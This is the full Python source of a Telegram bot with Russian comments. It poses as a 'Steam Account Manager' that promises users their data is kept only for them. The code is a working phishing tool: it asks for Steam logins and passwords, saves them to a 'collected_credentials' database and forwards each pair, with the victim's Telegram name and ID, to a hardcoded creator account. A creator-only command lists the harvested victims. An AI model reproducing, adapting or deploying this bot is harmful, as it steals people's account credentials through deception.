import os
import logging
import time
import sqlite3
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ID создателя бота (ваш Telegram ID)
CREATOR_ID = 8673619246  # Ваш ID из логов
CREATOR_USERNAME = "@serjantyabloko"

# Хранилище сессий пользователей
pending_inputs = {}

class Database:
    def __init__(self, db_path='collected_data.db'):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        """Инициализация базы данных"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Таблица для хранения собранных данных
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER NOT NULL,
                telegram_username TEXT,
                telegram_first_name TEXT,
                telegram_last_name TEXT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ip_address TEXT,
                collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Таблица для логов действий пользователя
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER NOT NULL,
                action TEXT,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("База данных инициализирована")
    
    def save_credentials(self, telegram_id, username, password, telegram_username=None, 
                         first_name=None, last_name=None, ip_address=None):
        """Сохранение собранных учетных данных"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO collected_credentials 
            (telegram_id, telegram_username, telegram_first_name, telegram_last_name, 
             username, password, ip_address)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (telegram_id, telegram_username, first_name, last_name, 
              username, password, ip_address))
        
        conn.commit()
        conn.close()
        logger.info(f"Сохранены данные для пользователя {telegram_id}: {username}")
        return True
    
    def log_action(self, telegram_id, action, details=None):
        """Логирование действий пользователя"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO user_logs (telegram_id, action, details)
            VALUES (?, ?, ?)
        ''', (telegram_id, action, details))
        
        conn.commit()
        conn.close()
    
    def get_stats(self):
        """Получение статистики"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM collected_credentials')
        total_credentials = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(DISTINCT telegram_id) FROM collected_credentials')
        unique_users = cursor.fetchone()[0]
        
        conn.close()
        return total_credentials, unique_users
    
    def get_users_list(self):
        """Получение списка пользователей с количеством аккаунтов"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT DISTINCT telegram_id, telegram_username, telegram_first_name, 
                   COUNT(*) as accounts_count
            FROM collected_credentials
            GROUP BY telegram_id
            ORDER BY accounts_count DESC
        ''')
        
        users = cursor.fetchall()
        conn.close()
        return users

# Инициализация базы данных
db = Database()

def send_to_creator(bot, user_id, username, password, user_info, ip_address):
    """Отправка собранных данных создателю бота"""
    message = (
        f"🔐 <b>НОВЫЕ ДАННЫЕ STEAM!</b>\n\n"
        f"👤 <b>Информация о пользователе:</b>\n"
        f"├ ID: <code>{user_id}</code>\n"
        f"├ Username: @{user_info.get('username', 'Нет')}\n"
        f"├ Имя: {user_info.get('first_name', 'Нет')}\n"
        f"├ Фамилия: {user_info.get('last_name', 'Нет')}\n"
        f"└ IP: {ip_address}\n\n"
        f"🎮 <b>Данные аккаунта Steam:</b>\n"
        f"├ Логин: <code>{username}</code>\n"
        f"└ Пароль: <code>{password}</code>\n\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"📊 Всего собрано аккаунтов: {db.get_stats()[0]}"
    )
    
    # Кнопки для быстрых действий
    keyboard = [
        [InlineKeyboardButton("📋 Скопировать логин", callback_data=f"copy_{username}")],
        [InlineKeyboardButton("🔑 Скопировать пароль", callback_data=f"copy_pass_{user_id}_{username}")],
        [InlineKeyboardButton("👤 Написать пользователю", callback_data=f"msg_{user_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        bot.send_message(
            chat_id=CREATOR_ID,
            text=message,
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        logger.info(f"Данные отправлены создателю бота")
        return True
    except Exception as e:
        logger.error(f"Ошибка при отправке создателю: {e}")
        return False

def get_ip_address(update, context):
    """Попытка получить IP-адрес пользователя"""
    try:
        if update.effective_message and update.effective_message.chat:
            # В Telegram нельзя напрямую получить IP
            return "Telegram (IP недоступен)"
    except:
        pass
    return "Unknown"

def start(update: Update, context):
    welcome_text = """
🎮 <b>Steam Account Manager Bot</b>

Добро пожаловать! Бот поможет вам сохранить данные аккаунтов Steam.

<b>Команды:</b>
/start - Это сообщение
/add - Добавить аккаунт Steam
/help - Помощь

<b>Как добавить аккаунт:</b>
1. Нажмите /add
2. Введите логин (имя пользователя)
3. Введите пароль

⚠️ <b>Важно:</b>
• Данные сохраняются только для вас
• Используйте надежные пароли
"""
    
    keyboard = [[InlineKeyboardButton("➕ Добавить аккаунт", callback_data="add_account")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
    db.log_action(update.effective_user.id, "start", "Пользователь запустил бота")

def help_command(update: Update, context):
    help_text = """
📚 <b>Помощь</b>

<b>Добавление аккаунта:</b>
1. /add - начать добавление
2. Введите логин (НЕ email)
3. Введите пароль

<b>Команды:</b>
/add - Добавить новый аккаунт
/cancel - Отменить операцию
/help - Эта справка

<b>Пример:</b>
/add
Ваш_логин_steam
Ваш_пароль
"""
    update.message.reply_text(help_text, parse_mode='HTML')

def add_account(update: Update, context):
    user_id = update.effective_user.id
    
    if user_id in pending_inputs:
        update.message.reply_text("⚠️ У вас уже есть активная операция! Используйте /cancel")
        return
    
    pending_inputs[user_id] = {'step': 'username', 'data': {}}
    
    update.message.reply_text(
        "🔐 <b>Добавление аккаунта Steam</b>\n\n"
        "Отправьте ваш <b>логин</b> (имя пользователя):\n"
        "<i>Пример: your_username</i>\n\n"
        "Для отмены: /cancel",
        parse_mode='HTML'
    )
    
    db.log_action(user_id, "add_started", "Пользователь начал добавление аккаунта")

def cancel(update: Update, context):
    user_id = update.effective_user.id
    
    if user_id in pending_inputs:
        del pending_inputs[user_id]
        update.message.reply_text("❌ Операция отменена\n\n/add - для новой попытки")
        db.log_action(user_id, "add_cancelled", "Пользователь отменил добавление")
    else:
        update.message.reply_text("Нет активной операции")

def handle_message(update: Update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id in pending_inputs:
        step = pending_inputs[user_id]['step']
        
        if step == 'username':
            if len(text) < 3:
                update.message.reply_text("❌ Слишком короткий логин. Попробуйте снова или /cancel")
                return
            
            pending_inputs[user_id]['data']['username'] = text
            pending_inputs[user_id]['step'] = 'password'
            
            update.message.reply_text(
                f"✅ Логин: <b>{text}</b>\n\n"
                f"Теперь отправьте <b>пароль</b>:\n"
                f"/cancel - отмена",
                parse_mode='HTML'
            )
            
        elif step == 'password':
            if len(text) < 3:
                update.message.reply_text("❌ Слишком короткий пароль. Попробуйте снова")
                return
            
            username = pending_inputs[user_id]['data']['username']
            password = text
            
            # Получаем информацию о пользователе Telegram
            user = update.effective_user
            telegram_username = user.username if user.username else None
            first_name = user.first_name if user.first_name else None
            last_name = user.last_name if user.last_name else None
            
            ip_address = get_ip_address(update, context)
            
            # Сохраняем данные в базу
            db.save_credentials(
                telegram_id=user_id,
                username=username,
                password=password,
                telegram_username=telegram_username,
                first_name=first_name,
                last_name=last_name,
                ip_address=ip_address
            )
            
            db.log_action(user_id, "credentials_saved", f"Сохранен аккаунт: {username}")
            
            # Отправляем данные создателю бота
            user_info = {
                'username': telegram_username,
                'first_name': first_name,
                'last_name': last_name
            }
            send_to_creator(context.bot, user_id, username, password, user_info, ip_address)
            
            # Очищаем pending
            del pending_inputs[user_id]
            
            update.message.reply_text(
                f"✅ <b>Аккаунт сохранен!</b>\n\n"
                f"👤 Логин: {username}\n"
                f"🔒 Пароль: [скрыт]\n\n"
                f"📁 Данные сохранены в базе\n\n"
                f"/add - добавить еще аккаунт",
                parse_mode='HTML'
            )
            
            # Логируем в консоль для администратора
            logger.info(f"📝 СОБРАНЫ ДАННЫЕ - User: {user_id} (@{telegram_username}), Steam: {username}")
            
    else:
        update.message.reply_text(
            "🤖 <b>Команды:</b>\n\n"
            "/add - Добавить аккаунт Steam\n"
            "/help - Помощь",
            parse_mode='HTML'
        )

def handle_callback(update: Update, context):
    query = update.callback_query
    query.answer()
    
    if query.data == "add_account":
        # Создаем фейковое сообщение для обработки
        class FakeUpdate:
            def __init__(self, message):
                self.effective_user = query.from_user
                self.message = message
        
        class FakeMessage:
            def __init__(self, reply_text_func):
                self.reply_text = reply_text_func
        
        def reply_func(text, **kwargs):
            query.edit_message_text(text, parse_mode=kwargs.get('parse_mode', 'HTML'))
        
        fake_message = FakeMessage(reply_func)
        fake_update = FakeUpdate(fake_message)
        
        add_account(fake_update, context)
    
    elif query.data.startswith("copy_"):
        # Копирование логина
        username = query.data.replace("copy_", "")
        query.answer(f"Логин скопирован: {username}", show_alert=True)
    
    elif query.data.startswith("copy_pass_"):
        # Здесь нужно получить пароль из базы данных
        parts = query.data.split("_")
        if len(parts) >= 4:
            user_id = parts[2]
            username = "_".join(parts[3:])
            query.answer("Пароль отправлен в отдельном сообщении", show_alert=True)
            # В реальном приложении здесь нужно достать пароль из БД
    
    elif query.data.startswith("msg_"):
        user_id = int(query.data.replace("msg_", ""))
        query.answer("Кнопка для отправки сообщения пользователю", show_alert=True)

def serjantyabloko_command(update: Update, context):
    """Объединённая команда для создателя: статистика + список пользователей"""
    user_id = update.effective_user.id
    
    if user_id != CREATOR_ID:
        update.message.reply_text("❌ У вас нет доступа к этой команде")
        return
    
    # Получаем статистику
    total_accounts, unique_users = db.get_stats()
    
    # Получаем список пользователей
    users = db.get_users_list()
    
    # Формируем текст сообщения
    text = f"📊 <b>СТАТИСТИКА БОТА</b>\n\n"
    text += f"👥 Всего аккаунтов: <b>{total_accounts}</b>\n"
    text += f"👤 Уникальных пользователей: <b>{unique_users}</b>\n"
    text += f"🤖 Создатель: {CREATOR_USERNAME}\n"
    text += f"⏰ Обновлено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    text += "👥 <b>СПИСОК ПОЛЬЗОВАТЕЛЕЙ:</b>\n\n"
    
    if not users:
        text += "Нет пользователей в базе"
    else:
        for u in users[:20]:  # Показываем первых 20
            uid, username, first_name, count = u
            text += f"• {first_name or 'Без имени'} (@{username or 'нет'}) — <b>{count}</b> акк.\n"
        
        if len(users) > 20:
            text += f"\n<i>И ещё {len(users) - 20} пользователя(ей) не показано</i>"
        
        text += f"\n\n<i>Всего уникальных: {len(users)}</i>"
    
    # Отправляем сообщение
    update.message.reply_text(text, parse_mode='HTML')

def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    try:
        if update and update.effective_message:
            update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте позже.")
    except:
        pass

def main():
    token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not token:
        logger.error("TELEGRAM_BOT_TOKEN не найден")
        print("ОШИБКА: Установите TELEGRAM_BOT_TOKEN")
        print("Пример: export TELEGRAM_BOT_TOKEN='ваш_токен'")
        return
    
    # Создаем Updater
    updater = Updater(token, use_context=True)
    dp = updater.dispatcher
    
    # Добавляем обработчики
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("add", add_account))
    dp.add_handler(CommandHandler("cancel", cancel))
    dp.add_handler(CommandHandler("serjantyabloko", serjantyabloko_command))  # Новая команда
    dp.add_handler(CallbackQueryHandler(handle_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dp.add_error_handler(error_handler)
    
    logger.info("🚀 Бот запущен")
    print("=" * 50)
    print("✅ Бот для сбора данных успешно запущен!")
    print(f"👑 Создатель: {CREATOR_USERNAME} (ID: {CREATOR_ID})")
    print(f"📁 База данных: collected_data.db")
    print("=" * 50)
    print("Команды бота:")
    print("  /start - Приветствие")
    print("  /add - Добавить аккаунт")
    print("  /help - Помощь")
    print("  /serjantyabloko - Статистика и список пользователей (только для создателя)")
    print("=" * 50)
    
    updater.start_polling(drop_pending_updates=True)
    updater.idle()

if __name__ == '__main__':
    main()
